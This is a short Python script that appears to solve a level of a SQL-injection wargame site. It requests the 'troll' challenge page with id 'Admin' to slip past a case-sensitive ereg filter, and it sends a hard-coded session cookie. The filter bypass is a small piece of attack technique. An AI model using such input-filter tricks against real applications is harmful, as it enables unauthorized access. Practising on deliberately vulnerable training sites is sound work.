import requests

url = "http://los.rubiya.kr/troll_05b5eb65d94daf81c42dd44136cb0063.php"

params = {
    "id":"Admin"
    # ereg not option "i5"
}
headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

res = requests.get(url, params=params, headers=headers)
print res.content